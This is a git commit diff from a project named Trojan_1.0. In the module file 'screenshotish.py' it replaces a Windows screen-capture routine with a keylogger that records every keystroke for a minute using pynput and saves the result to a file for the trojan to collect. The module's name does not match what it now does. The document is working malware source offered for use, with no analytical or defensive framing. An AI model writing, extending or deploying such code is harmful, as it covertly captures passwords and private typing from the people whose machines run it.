de0de85da73e039654d924891908239e1af4d57e
Corey Jones <hackspark@outlook.com>
2024-08-11 07:48:26 -0400

    Added module

--- Trojan_1.0/modules/screenshotish.py
+++ Trojan_1.0/modules/screenshotish.py
@@ -1,48 +1,25 @@
-import os
-import win32api
-import win32con
-import win32gui
-import win32ui
-
-def get_dimensions():
-    width = win32api.GetSystemMetrics(win32con.SM_CXVIRTUALSCREEN)
-    height = win32api.GetSystemMetrics(win32con.SM_CYVIRTUALSCREEN)
-    left = win32api.GetSystemMetrics(win32con.SM_XVIRTUALSCREEN)
-    top = win32api.GetSystemMetrics(win32con.SM_YVIRTUALSCREEN)
-    return (width, height, left, top)
-
-def screenshot(directory='screen', name='screenshot'):
-    # Create the directory if it doesn't exist
-    if not os.path.exists(directory):
-        os.makedirs(directory)
-
-    hdesktop = win32gui.GetDesktopWindow()
-    width, height, left, top = get_dimensions()
-
-    desktop_dc = win32gui.GetWindowDC(hdesktop)
-    img_dc = win32ui.CreateDCFromHandle(desktop_dc)
-    mem_dc = img_dc.CreateCompatibleDC()
-
-    screenshot_bitmap = win32ui.CreateBitmap()
-    screenshot_bitmap.CreateCompatibleBitmap(img_dc, width, height)
-    mem_dc.SelectObject(screenshot_bitmap)
-
-    mem_dc.BitBlt((0, 0), (width, height), img_dc, (left, top), win32con.SRCCOPY)
-
-    file_path = os.path.join(directory, f'{name}.bmp')
-    screenshot_bitmap.SaveBitmapFile(mem_dc, file_path)
-
-    mem_dc.DeleteDC()
-    win32gui.DeleteObject(screenshot_bitmap.GetHandle())
-
-    print(f"Screenshot saved to {file_path}")
+import pynput.keyboard
+import time
 
 def run():
-    screenshot()
-    with open('screen/screenshot.bmp', 'rb') as f:  # Updated to reflect the new directory
-        img = f.read()
-    return img
+    log = []
 
-if __name__ == '__main__':
-    screenshot()
+    def on_press(key):
+        try:
+            log.append(key.char)
+        except AttributeError:
+            log.append(f"[{key}]")
+
+    listener = pynput.keyboard.Listener(on_press=on_press)
+    listener.start()
+
+    # Capture keystrokes for a set amount of time
+    time.sleep(60)  # 1 minute
+    listener.stop()
+
+    log_data = ''.join(log)
+    with open('keylogger_output.txt', 'w') as file:
+        file.write(log_data)
+
+    return 'keylogger_output.txt'
 
